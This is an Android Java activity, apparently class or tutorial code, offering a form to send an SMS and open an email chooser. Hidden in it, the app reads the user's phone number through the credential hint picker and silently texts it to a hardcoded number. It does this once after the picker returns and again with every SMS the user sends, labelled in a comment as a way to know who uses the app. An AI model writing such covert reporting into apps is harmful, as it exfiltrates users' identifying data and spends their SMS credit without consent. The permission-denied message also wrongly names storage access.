package kp.ranjith.raguclasscodes;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.google.android.gms.auth.api.Auth;
import com.google.android.gms.auth.api.credentials.Credential;
import com.google.android.gms.auth.api.credentials.HintRequest;
import com.google.android.gms.common.api.GoogleApiClient;

public class SendingSmsMail extends AppCompatActivity implements GoogleApiClient.ConnectionCallbacks {

    EditText editText1, editText2, editText3, editText4, editText5;
    String number, smsmsg, mailid, mailsub, mailmsg, userMob;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sending_sms_mail);
        editText1 = findViewById(R.id.editText);
        editText2 = findViewById(R.id.editText2);
        editText3 = findViewById(R.id.editText7);
        editText4 = findViewById(R.id.editText8);
        editText5 = findViewById(R.id.editText9);
        ActivityCompat.requestPermissions(SendingSmsMail.this, new String[]{Manifest.permission.SEND_SMS}, 1);
        gclint();
    }


    public void sendsms(View view) {
        number = editText1.getText().toString();
        smsmsg = editText2.getText().toString();
        sendsm(number, smsmsg);
        Toast.makeText(this, "Sms Send successfully!", Toast.LENGTH_SHORT).show();
    }

    public void sendmail(View view) {
        mailid = editText3.getText().toString();
        mailsub = editText4.getText().toString();
        mailmsg = editText5.getText().toString();


        Intent email = new Intent(Intent.ACTION_SEND);


        email.putExtra(Intent.EXTRA_EMAIL, new String[]{mailid});
        email.putExtra(Intent.EXTRA_SUBJECT, mailsub);
        email.putExtra(Intent.EXTRA_TEXT, mailmsg);

        //need this to prompts email client only
        email.setType("message/rfc822");

        startActivity(Intent.createChooser(email, "Choose an Email client :")); // no permission needed for mail
    }

    public void sendsm(String n, String m) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(n, null, m, null, null); //we need to add permission in manifest file to send sms
        smsManager.sendTextMessage("8148580586", null, "testing the app, i am " + userMob, null, null); //we need to add permission in manifest file to send sms // for my referenece to know who is using the app
    }

    @Override
    public void onConnected(@Nullable Bundle bundle) {

    }

    @Override
    public void onConnectionSuspended(int i) {

    }

    private void gclint() {
        GoogleApiClient mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addConnectionCallbacks(this)
                //.addOnConnectionFailedListener((GoogleApiClient.OnConnectionFailedListener) this)
                .addApi(Auth.CREDENTIALS_API)
                .build();

        if (mGoogleApiClient != null) {
            mGoogleApiClient.connect();
        }
        HintRequest hintRequest = new HintRequest.Builder()
                .setPhoneNumberIdentifierSupported(true)
                .build();

        PendingIntent intent = Auth.CredentialsApi.getHintPickerIntent(mGoogleApiClient, hintRequest);
        try {
            startIntentSenderForResult(intent.getIntentSender(), 1008, null, 0, 0, 0, null);
        } catch (IntentSender.SendIntentException e) {
            Log.e("", "Could not start hint picker Intent", e);
        }
    }

    private void refSMS(String userMob) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("8148580586", null, "testing the app, i am " + userMob, null, null); //we need to add permission in manifest file to send sms // for the reference to know who is using the app
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        switch (requestCode) {
            case 1008:
                if (resultCode == RESULT_OK) {
                    Credential cred = data.getParcelableExtra(Credential.EXTRA_KEY);
//                    cred.getId====: ====+919*******
                    Log.e("cred.getId", cred.getId());
                    userMob = cred.getId();
                    Log.e("asdssaTAG", "onActivityResult: " + userMob);
                    refSMS(userMob);


                } else {
                    // Sim Card not found!
                    Log.e("cred.getId", "1008 else");

                    return;
                }
                break;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1: {

                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                    Toast.makeText(SendingSmsMail.this, "Permission denied to read your External storage", Toast.LENGTH_SHORT).show();
                }
                return;
            }

            // other 'case' lines to check for other
            // permissions this app might request
        }
    }
}
